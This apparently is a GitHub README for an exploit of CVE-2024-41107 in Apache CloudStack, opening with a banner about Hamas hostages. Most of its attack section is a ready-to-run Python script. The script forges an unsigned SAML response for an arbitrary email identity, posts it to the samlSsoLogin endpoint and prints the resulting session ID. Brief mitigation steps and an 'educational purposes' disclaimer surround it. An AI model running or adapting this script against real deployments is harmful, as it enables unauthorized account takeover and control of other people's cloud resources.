<div align="center">

 #  🇮🇱  **#BringThemHome #NeverAgainIsNow**   🇮🇱

**We demand the safe return of all citizens who have been taken hostage by the terrorist group Hamas. We will not rest until every hostage is released and returns home safely. You can help bring them back home.
https://stories.bringthemhomenow.net/**

</div>
# 🚀 CVE-2024-41107 Exploit 🚀

This repository contains an exploit for the critical vulnerability identified as **CVE-2024-41107** in Apache CloudStack. This vulnerability affects versions **4.5.0 through 4.18.2.1** and **4.19.0.0 through 4.19.0.2**. The flaw lies within the Security Assertion Markup Language (SAML) authentication mechanism, allowing attackers to submit unsigned SAML responses to gain unauthorized access to user accounts and control over cloud resources.

## ⚠️ Disclaimer ⚠️

This code is for **educational purposes only**. Unauthorized access to computer systems is illegal and unethical. Use this information responsibly and within the boundaries of the law.

## ✨ Features ✨

- Exploits the SAML authentication vulnerability in Apache CloudStack
- Bypasses signature checks to gain unauthorized access
- Demonstrates the critical nature of CVE-2024-41107

## 🛠️ Requirements 🛠️

- Python 3.x
- `requests` library
- `beautifulsoup4` library

Install the required libraries using:

```bash
pip install requests beautifulsoup4
```

## 📄 Usage 📄

1. **Clone the repository:**

```bash
git clone https://github.com/yourusername/cve-2024-41107-exploit.git
cd cve-2024-41107-exploit
```

2. **Edit the Exploit Code:**

Update the `url` and `saml_response_template` variables in `exploit.py` with the target CloudStack instance and your SAML issuer details.

3. **Run the Exploit:**

```bash
python exploit.py
```

4. **Check the Response:**

If successful, the script will print the session ID indicating unauthorized access.

## 👨‍💻 Code 👨‍💻

```python
import requests
from bs4 import BeautifulSoup

# URL of the login endpoint
url = "http://target-cloudstack-instance.com/client/api"

# Unsigned SAML response template
saml_response_template = """
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_8f0d8b57b7b34a1a8f0d8b57b7b34a1a" Version="2.0" IssueInstant="2024-07-23T00:00:00Z" Destination="http://target-cloudstack-instance.com/client/api">
    <saml:Issuer>http://your-saml-issuer.com</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion Version="2.0" ID="_abc123" IssueInstant="2024-07-23T00:00:00Z">
        <saml:Issuer>http://your-saml-issuer.com</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">hacker@example.com</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotOnOrAfter="2024-07-23T01:00:00Z" Recipient="http://target-cloudstack-instance.com/client/api"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="2024-07-23T00:00:00Z" NotOnOrAfter="2024-07-23T01:00:00Z">
            <saml:AudienceRestriction>
                <saml:Audience>http://target-cloudstack-instance.com/client/api</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="2024-07-23T00:00:00Z" SessionIndex="_abc123">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
    </saml:Assertion>
</samlp:Response>
"""

# Send the unsigned SAML response
data = {
    "command": "samlSsoLogin",
    "SAMLResponse": saml_response_template
}

response = requests.post(url, data=data)

# Check the response
if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')
    print("Login successful, session ID:", soup.find('sessionid').text)
else:
    print("Login failed, status code:", response.status_code)
```

## 🔒 Mitigation 🔒

To mitigate this vulnerability, users are advised to:

- Disable SAML authentication by setting the `saml2.enabled` global setting to `false`.
- Upgrade to the patched versions **4.18.2.2** or **4.19.1.0** released by Apache.
- Review access logs for signs of exploitation.



---

⚠️ **Disclaimer:** This code is for educational purposes only. Unauthorized use of this code is illegal. Always ensure you have permission before testing against any system.
